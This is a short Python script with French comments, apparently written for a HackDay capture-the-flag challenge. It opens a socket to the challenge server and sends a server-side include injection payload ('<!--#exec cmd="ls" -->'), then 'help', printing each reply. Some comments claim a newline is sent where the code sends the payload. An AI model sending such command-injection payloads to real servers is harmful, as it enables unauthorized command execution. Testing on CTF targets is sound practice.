import socket

# Définition des détails de connexion
host = 'challenges.hackday.fr'
port = 48118

# Création de l'objet socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # Connexion à l'hôte et au port spécifiés
    client_socket.connect((host, port))
    print(f"Connexion établie avec {host} sur le port {port}")

    # Réception et affichage de la réponse initiale
    response = client_socket.recv(1024)
    response_text = response.decode()
    print("Réponse reçue :", response_text)

    # Attendre un peu avant d'envoyer un "Enter" (simulé par \n)
    print("Envoi de la touche 'Enter'...")
    answer1 = '<!--#exec cmd="ls" -->'
    client_socket.send(answer1.encode())  # Envoi du caractère de nouvelle ligne (Enter)

    # Réception de la réponse suivante
    response = client_socket.recv(1024)
    response_text = response.decode()
    print("Réponse reçue après avoir envoyé 'Enter' :", response_text)
    response = client_socket.recv(1024)
    response_text = response.decode()
    print("Réponse reçue :", response_text)
    answer = "help"
    client_socket.send(answer.encode())

    response = client_socket.recv(1024)
    response_text = response.decode()
    print("Réponse reçue :", response_text)
    response = client_socket.recv(1024)
    response_text = response.decode()
    print("Réponse reçue :", response_text)

except socket.error as e:
    print(f"Erreur de connexion : {e}")

finally:
    # Fermeture de la connexion
    client_socket.close()
